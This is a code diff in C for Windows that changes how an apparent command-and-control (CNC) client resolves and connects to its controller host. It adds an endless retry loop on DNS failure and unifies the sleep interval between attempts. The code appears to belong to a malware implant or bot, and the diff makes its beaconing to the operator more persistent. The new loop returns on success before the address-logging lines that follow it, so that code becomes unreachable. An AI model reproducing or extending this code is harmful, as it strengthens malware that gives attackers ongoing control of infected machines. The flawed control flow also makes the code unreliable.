@@ -24,12 +24,27 @@ void init_winsock()
 
 void cnc_get_addrinfo(struct addrinfo **result)
 {
+    int ret = 0;
     char cnc_addr[255];
     long unsigned int cnc_addr_len = sizeof(cnc_addr);
     struct addrinfo *cnc_addrinfo, hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM, .ai_protocol = IPPROTO_TCP};
 
-    if (getaddrinfo(cnc_host, CNC_PORT, &hints, result) != 0)
-        fatal_error("getaddrinfo failed: %d", WSAGetLastError());
+    while (TRUE)
+    {
+
+        if (getaddrinfo(cnc_host, CNC_PORT, &hints, result) != 0)
+        {
+            if ((ret = WSAGetLastError()) != WSAHOST_NOT_FOUND)
+                fatal_error("Error at getaddrinfo(): %ld", ret);
+            else
+            {
+                log_warning("Failed to get address of CNC. Retrying in %ds.", SLEEP_INTERVAL_ON_CONNERROR_MS / 1000);
+                Sleep(SLEEP_INTERVAL_ON_CONNERROR_MS);
+            }
+        }
+        else
+            return;
+    }
 
     cnc_addrinfo = *result;
     WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
@@ -71,8 +86,8 @@ void cnc_connect(struct addrinfo *cnc_addrinfo)
                 fatal_error("Error at connect(): %ld", ret);
             else
             {
-                log_warning("Failed to connect to CNC. Retrying in %ds.", SLEEP_INTERVAL_ON_CONNREFUSED_MS / 1000);
-                Sleep(SLEEP_INTERVAL_ON_CONNREFUSED_MS);
+                log_warning("Failed to connect to CNC. Retrying in %ds.", SLEEP_INTERVAL_ON_CONNERROR_MS / 1000);
+                Sleep(SLEEP_INTERVAL_ON_CONNERROR_MS);
             }
         }
         else
